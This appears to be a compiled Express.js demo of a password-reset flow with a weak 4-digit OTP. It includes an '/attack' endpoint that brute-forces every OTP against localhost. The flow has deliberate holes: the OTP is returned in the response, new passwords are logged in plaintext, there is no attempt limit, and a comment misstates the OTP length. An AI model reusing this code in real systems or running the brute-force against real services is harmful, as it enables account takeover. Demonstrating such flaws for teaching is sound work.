"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const axios_1 = __importDefault(require("axios"));
const app = (0, express_1.default)();
const PORT = 3000;
app.use(express_1.default.json());
// Store OTPs in a simple in-memory object
const otpStore = {};
// Endpoint to generate and log OTP
app.post('/generate-otp', (req, res) => {
    const email = req.body.email;
    if (!email) {
        res.status(400).json({ message: "Email is required" });
        return;
    }
    const otp = Math.floor(1000 + Math.random() * 9000).toString(); // generates a 6-digit OTP
    otpStore[email] = otp;
    console.log(`OTP for ${email}: ${otp}`); // Log the OTP to the console
    res.status(200).json({ message: "OTP generated and logged", otp: otp });
});
// Endpoint to reset password
app.post('/reset-password', (req, res) => {
    const { email, otp, newPassword } = req.body;
    if (!email || !otp || !newPassword) {
        res.status(400).json({ message: "Email, OTP, and new password are required" });
        return;
    }
    if (otpStore[email] === otp) {
        console.log(`Password for ${email} has been reset to: ${newPassword}`);
        delete otpStore[email]; // Clear the OTP after use
        res.status(200).json({ message: "Password has been reset successfully" });
    }
    else {
        console.log(`Invalid OTP for ${email}: ${otp}`);
        res.status(401).json({ message: "Invalid OTP" });
    }
});
app.post('/attack', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    const { email, otp, newPassword } = req.body;
    for (let i = 1000; i < 9999; i++) {
        console.log(`Trying OTP: ${i}`);
        try {
            let resetPassword = yield axios_1.default.post('http://localhost:3000/reset-password', {
                email,
                otp: i.toString(),
                newPassword
            });
            if (resetPassword.status === 200) {
                res.status(200).json({ message: "Password reset successfully" });
                return;
            }
            else {
                console.log(`Unexpected status code: ${resetPassword.status}`);
            }
        }
        catch (error) {
            if (error.response && error.response.status === 401) {
                console.log(`Invalid OTP: ${i}`);
            }
            else {
                console.log(`Error occurred: ${error.message}`);
            }
        }
    }
    res.status(200).json({ message: "Attack completed" });
}));
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
